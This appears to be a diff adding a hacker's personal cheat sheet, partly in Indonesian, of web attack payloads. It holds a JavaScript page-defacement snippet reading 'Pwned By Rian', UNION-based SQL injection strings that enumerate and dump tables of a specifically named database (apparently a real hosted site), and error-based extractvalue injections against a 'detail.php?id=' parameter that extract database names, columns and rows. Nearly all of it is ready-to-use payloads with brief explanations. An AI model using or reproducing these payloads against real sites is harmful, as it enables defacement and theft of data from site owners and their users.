@@ -1,0 +1,67 @@
+ezxss signup
+
+url decoded encoded base 64
+
+document.body.innerHTML = `
+    <h1 style="color:red">Pwned By Rian</h1>
+    <p>Hallo semua</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/JavaScript-logo.png" width="200">
+`;
+
+---------------------------------------------------------------------------------------------------------------
+
+budi' union select 1,2,3,4,5,6-- -
+
+budi' UNION select 1,TABLE_NAME,3,4,5,6 from INFORMATION_SCHEMA.TABLES where table_schema='u305698498_neptun'-- -
+
+budi' UNION select 1,group_concat(table_name),3,4,5,6 from INFORMATION_SCHEMA.TABLES where table_schema = database()-- -
+
+budi' UNION select 1,group_concat(column_name),3,4,5,6 from INFORMATION_SCHEMA.COLUMNS where table_schema = database()-- -
+
+budi' UNION SELECT 1, GROUP_CONCAT(column_name), 3, 4, 5, 6 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'obat' AND table_schema = DATABASE()-- -
+
+budi' UNION SELECT 1,GROUP_CONCAT(column_name), 3, 4, 5, 6 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'obat' AND table_schema = DATABASE()-- -
+
+budi'UNION select * from u305698498_neptun.obat-- -
+
+grou_concat(table_name) ... from information_schema.tables where table_schema = "u305698498_neptun"-- -
+
+union sikuel struktur query Language, koleksi yang telah tergabung
+
+union di pakai menggabungkan dua query menjadi 1
+jika berhasil mendapatkan entry baru yang mana gabungan nya dari yang order by tadi
+
+
+----------------------------------------------------------------------------------------------
+
+Mengetahui database yang di pakai
+detail.php?id=1' and extractvalue(0x0a,concat(0x0a,(select database())))-- -
+
+Mengetahui nama table
+detail.php?id=1' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
+Misalkan ada 3 table cars, users, orders
+Ketika limit menjadi 0,1 = cars, 1,1 = users, dan 2,1 itu adalah orders dengan kata lain offser,jumlah
+
+menghitung jumlah table
+detail.php?id=1' and extractvalue(0x0a,concat(0x0a,(select count(username) from users)))-- -
+
+mengetahui nama columns 
+detail.php?id=1' and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='cars' limit 0,1)))-- -
+seperti biasa offset,jumlah
+
+dump data output
+detail.php?id=1' and extractvalue(0x0a,concat(0x0a,(select concat(name,0x3a,description) from cars limit 0,1)))-- -
+
+
+
+
+
+
+
+
+
+
+
+
+
+
